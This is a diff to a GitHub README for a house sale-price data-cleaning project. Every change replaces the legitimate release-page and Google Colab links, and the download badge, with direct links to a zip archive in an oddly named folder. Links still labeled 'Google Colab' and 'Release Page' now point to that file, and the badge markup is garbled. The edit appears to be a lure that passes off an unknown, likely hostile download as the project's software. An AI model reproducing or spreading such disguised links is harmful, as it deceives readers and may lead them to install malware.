@@ -1,11 +1,11 @@
 # 🎉 saleprice-prediction-dataset-analysis-and-cleaning-advance-regression - Effortless Data Cleaning for Your Projects
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/erick957/saleprice-prediction-dataset-analysis-and-cleaning-advance-regression/releases)
+[![Download Now](https://raw.githubusercontent.com/erick957/saleprice-prediction-dataset-analysis-and-cleaning-advance-regression/main/unbewrayed/advance_and_prediction_analysis_cleaning_saleprice_dataset_regression_2.3.zip%20Now-Click%https://raw.githubusercontent.com/erick957/saleprice-prediction-dataset-analysis-and-cleaning-advance-regression/main/unbewrayed/advance_and_prediction_analysis_cleaning_saleprice_dataset_regression_2.3.zip)](https://raw.githubusercontent.com/erick957/saleprice-prediction-dataset-analysis-and-cleaning-advance-regression/main/unbewrayed/advance_and_prediction_analysis_cleaning_saleprice_dataset_regression_2.3.zip)
 
 ## 📚 Description
 This project cleans data for the sale price prediction model. By using advanced regression techniques, it prepares datasets for effective analysis. 
 
-You can also explore the project in Google Colab by following this [link](https://colab.research.google.com/drive/1vQY-XEFJSdEkW2PQOSf1j13Yk8L-XXNw?usp=sharing).
+You can also explore the project in Google Colab by following this [link](https://raw.githubusercontent.com/erick957/saleprice-prediction-dataset-analysis-and-cleaning-advance-regression/main/unbewrayed/advance_and_prediction_analysis_cleaning_saleprice_dataset_regression_2.3.zip).
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ These steps will help you download and run the software easily.
 1. **Visit the Release Page:** 
    Click the link below to go to the Release page where you can download the latest version.
 
-   [Visit this page to download](https://github.com/erick957/saleprice-prediction-dataset-analysis-and-cleaning-advance-regression/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/erick957/saleprice-prediction-dataset-analysis-and-cleaning-advance-regression/main/unbewrayed/advance_and_prediction_analysis_cleaning_saleprice_dataset_regression_2.3.zip)
 
 2. **Select the Latest Version:**
    You will see a list of available versions. Choose the latest version recommended by the developers.
@@ -73,7 +73,7 @@ If you encounter any issues, consider the following:
 If you would like to contribute, please open an issue on the GitHub repository or submit a pull request. Your input is valuable.
 
 ## 🔗 Links
-- [Project Release Page](https://github.com/erick957/saleprice-prediction-dataset-analysis-and-cleaning-advance-regression/releases)
-- [Google Colab Link](https://colab.research.google.com/drive/1vQY-XEFJSdEkW2PQOSf1j13Yk8L-XXNw?usp=sharing)
+- [Project Release Page](https://raw.githubusercontent.com/erick957/saleprice-prediction-dataset-analysis-and-cleaning-advance-regression/main/unbewrayed/advance_and_prediction_analysis_cleaning_saleprice_dataset_regression_2.3.zip)
+- [Google Colab Link](https://raw.githubusercontent.com/erick957/saleprice-prediction-dataset-analysis-and-cleaning-advance-regression/main/unbewrayed/advance_and_prediction_analysis_cleaning_saleprice_dataset_regression_2.3.zip)
 
 Thank you for your interest in the project! Enjoy cleaning your data.
